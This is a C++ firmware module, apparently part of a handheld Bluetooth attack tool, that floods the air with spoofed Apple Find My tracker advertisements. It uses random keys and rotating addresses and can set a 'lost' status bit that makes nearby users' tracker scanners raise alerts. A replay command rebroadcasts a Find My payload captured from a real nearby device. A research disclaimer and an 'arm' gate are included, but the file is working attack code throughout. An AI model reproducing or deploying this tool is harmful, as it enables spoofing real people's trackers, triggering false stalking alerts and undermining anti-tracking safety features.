// ============================================================================
// bt_phantom.cpp — Phantom Flood
//
// Broadcasts well-formed Apple Find My "offline finding" advertisements with
// randomly generated 22-byte public keys (rotated every N bursts) and random
// static BLE addresses. Format (31-byte legacy AD):
//   [0x1E][0xFF][0x4C 0x00][0x12][0x19][status][22B pubkey][2B hint]
// The status byte bit 0x40 marks the "lost/unpublished" state some scanners
// (AirGuard etc.) surface to nearby users — toggleable via `phantom lost on`.
//
// `phantom replay <idx>` rebroadcasts a captured FindMy payload from the
// shared device table (Tracker Scan) — the OpenTag "replay" capability.
//
// This is published, well-understood spoofing research. It demonstrates why
// unauthenticated tracker broadcasts cannot be trusted. Use only where legal
// and authorized; never to harass or to tamper with other people's accounts.
// ============================================================================
#include "bt_phantom.h"

static bool     s_running   = false;
static bool     s_lostMode  = false;
static uint32_t s_count     = 0;      // target bursts, 0 = infinite
static uint32_t s_sent      = 0;
static uint8_t  s_pubkey[BT_PAYLOAD_KEY_LEN];
static uint8_t  s_hint[2]   = {0x00, 0x00};
static uint8_t  s_buf[31];
static uint8_t  s_rotateN   = BT_PHANTOM_ROTATE_N;
static uint32_t s_rotations = 0;
static uint8_t  s_replaySlot = 0xFF;  // replay mode
static uint32_t s_replayMax = 0;

static void gen_pubkey() {
    for (int i = 0; i < BT_PAYLOAD_KEY_LEN; i++) s_pubkey[i] = random(256);
    // EC public keys are points; random bytes are fine for advertisement-level
    // spoofing experiments (the finder device simply fails to decrypt and
    // drops the report — exactly the behaviour we want to demonstrate).
}

static void build_frame() {
    memset(s_buf, 0, sizeof(s_buf));
    s_buf[0] = 0x1E;          // AD length
    s_buf[1] = 0xFF;          // type: manufacturer specific data
    s_buf[2] = 0x4C; s_buf[3] = 0x00;   // Apple, Inc.
    s_buf[4] = 0x12;          // FindMy offline finding
    s_buf[5] = 0x19;          // section length (25)
    s_buf[6] = s_lostMode ? 0x40 : 0x19;  // status byte (0x19 = typical awake)
    memcpy(&s_buf[7],  s_pubkey, BT_PAYLOAD_KEY_LEN);
    memcpy(&s_buf[29], s_hint, 2);
}

static bool start_tx() {
    build_frame();
    return bt_tx_raw(s_buf, sizeof(s_buf), 60 /*ms*/, true /*rotate addr*/);
}

bool bt_phantom_running() { return s_running; }

bool bt_phantom_command(const String& c) {
    if (!c.startsWith("phantom")) return false;
    String a = c.substring(7); a.trim();

    if (a.startsWith("start")) {
        if (!bt_is_armed()) {
            Serial.println("[phantom] refused — run `bt arm` first (authorized use only)");
            return true;
        }
        if (bt_phantom_running()) bt_phantom_stop();
        String rest = a.substring(5); rest.trim();
        s_count = rest.length() ? (uint32_t)rest.toInt() : 0;
        gen_pubkey();
        s_sent = 0; s_rotations = 0; s_replaySlot = 0xFF;
        s_running = true;
        start_tx();
        Serial.printf("[phantom] flooding %s FindMy adverts (rotate key every %u bursts)\n",
                      s_count ? String(s_count).c_str() : "infinitely", s_rotateN);
        return true;
    }
    if (a.startsWith("replay")) {
        if (!bt_is_armed()) {
            Serial.println("[phantom] refused — run `bt arm` first (authorized use only)");
            return true;
        }
        // replay <idx> [count]
        String rest = a.substring(6); rest.trim();
        int sp = rest.indexOf(' ');
        String idxS = (sp < 0) ? rest : rest.substring(0, sp);
        String cntS = (sp < 0) ? ""   : rest.substring(sp + 1);
        int idx = idxS.toInt();
        bt_dev_t* d = bt_dev_get(idx);
        if (!d || d->plen < 31) {
            Serial.println("[phantom] no captured FindMy payload at that index (run `tracker scan` first)");
            return true;
        }
        // validate FindMy shape before rebroadcast
        if (!(d->payload[1] == 0xFF && d->payload[2] == 0x4C && d->payload[3] == 0x00 &&
              d->payload[4] == 0x12 && d->payload[5] == 0x19)) {
            Serial.println("[phantom] payload is not an Apple FindMy advertisement");
            return true;
        }
        s_replayMax = cntS.length() ? (uint32_t)cntS.toInt() : 1000;
        s_replaySlot = idx;
        s_count = 0; s_sent = 0;
        s_running = true;
        bt_tx_raw(d->payload, d->plen, 60, false /*keep identity stable*/);
        Serial.printf("[phantom] replaying #%d (%s) %lu bursts\n",
                      idx, bt_mac_str(d->mac).c_str(), (unsigned long)s_replayMax);
        return true;
    }
    if (a == "stop") { bt_phantom_stop(); return true; }
    if (a == "lost on")  { s_lostMode = true;  Serial.println("[phantom] lost-mode bit ON");  return true; }
    if (a == "lost off") { s_lostMode = false; Serial.println("[phantom] lost-mode bit OFF"); return true; }
    if (a.startsWith("rotate")) {
        int n = a.substring(6).toInt();
        if (n >= 1 && n <= 255) { s_rotateN = n; Serial.printf("[phantom] rotate every %u bursts\n", s_rotateN); }
        else Serial.println("usage: phantom rotate <1-255>");
        return true;
    }
    Serial.println("usage: phantom start [count] | phantom stop | phantom lost on|off | phantom rotate <n> | phantom replay <idx> [count]");
    return true;
}

void bt_phantom_stop() {
    if (!s_running) return;
    s_running = false;
    bt_tx_stop();
    Serial.printf("[phantom] stopped after %lu bursts\n", (unsigned long)s_sent);
}

void bt_phantom_loop() {
    if (!s_running) return;
    if (!bt_tx_active()) {                 // radio yanked by another module
        s_running = false;
        return;
    }
    if (s_replaySlot != 0xFF) {
        // replay: count real advert repetitions from the TX engine
        static uint32_t lastRep = 0;
        uint32_t rep = bt_tx_repeats();
        if (rep != lastRep) {
            lastRep = rep;
            s_sent = rep;
            if (s_replayMax && s_sent >= s_replayMax) bt_phantom_stop();
        }
        return;
    }
    // fresh identity burst: one key rotation per cycle; the TX engine repeats
    // the frame at its interval until the next rotation lands.
    static uint32_t lastRotateMs = 0;
    if (lastRotateMs == 0 || millis() - lastRotateMs >= (uint32_t)s_rotateN * 60) {
        lastRotateMs = millis();
        gen_pubkey();
        s_rotations++;
        s_sent++;
        bt_tx_rearm();                     // push the new payload
        if (s_count && s_sent >= s_count) bt_phantom_stop();
    }
}

bool bt_phantom_status(BtUiState& out) {
    if (!s_running) return false;
    out.title    = "Phantom Flood";
    out.running  = true;
    out.phase    = s_replaySlot != 0xFF ? "replaying" : "flooding";
    out.module   = BT_MOD_PHANTOM;
    out.lineCount = 0;
    if (s_replaySlot != 0xFF) {
        out.lines[out.lineCount++] = "replaying device #" + String(s_replaySlot);
    } else {
        out.lines[out.lineCount++] = bt_fmt("bursts: %lu", (unsigned long)s_sent);
        out.lines[out.lineCount++] = bt_fmt("key rotations: %lu", (unsigned long)s_rotations);
        out.lines[out.lineCount++] = bt_fmt("lost-mode bit: %s", s_lostMode ? "ON" : "off");
    }
    return true;
}
